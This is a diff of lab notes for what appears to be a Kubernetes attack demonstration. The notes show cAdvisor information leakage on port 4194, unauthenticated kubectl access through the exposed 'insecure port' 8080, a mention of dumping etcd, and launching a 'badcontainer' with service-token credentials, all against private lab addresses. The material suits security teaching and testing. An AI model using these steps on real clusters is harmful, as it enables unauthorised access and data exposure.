@@ -6,12 +6,18 @@ kubectl create -f example.yaml
 
 This should spin up the guestbook example using the repo. on 192.168.111.50 (don't forget to start this VM)
 
+then kubectl get svc to get a note of the port to check for the service.
+
+then http://knode1:<port>
+
+to demonstrate the service running
+
 
 ## cAdvisor Information Leakage
 
 The cAdvisor port is exposed by default in many k8s installations at 4194/TCP.  So in a browser assuming that we have access to the cluster over a network we can simply browse to the port to look around
 
-https://192.168.41.111:4194 
+http://192.168.111.10:4194 
 
 and it'll show us information relating to the cluster.  Whilst none of it is an immediate slam dunk compromise, it does provide quite a bit of interesting info. that could be useful.
 
@@ -19,7 +25,7 @@ and it'll show us information relating to the cluster.  Whilst none of it is an 
 
 Externally you'd expect most clusters to require authentication externally, however if the well named "insecure port" is exposed on port 8080 it's relatively simple to get access
 
-kubectl -s=http://192.168.111.10:8080 get po
+kubectl -s=http://192.168.111.10:8080 get nodes
 
 ##  Attacking the Kubelet
 
@@ -53,5 +59,5 @@ This dumps the etcd database into a file.  It's not pure text however things lik
 # Using Service Tokens
 
 export KUBECONFIG=/root/admin.conf
-kubectl exec -it badcontainer-3610113689-3sw9d /bin/sh
+kubectl run badcontainer --image=192.168.111.50:5000/alpine-containertools
 kubectl config set-cluster test --server=https://192.168.111.10:6443
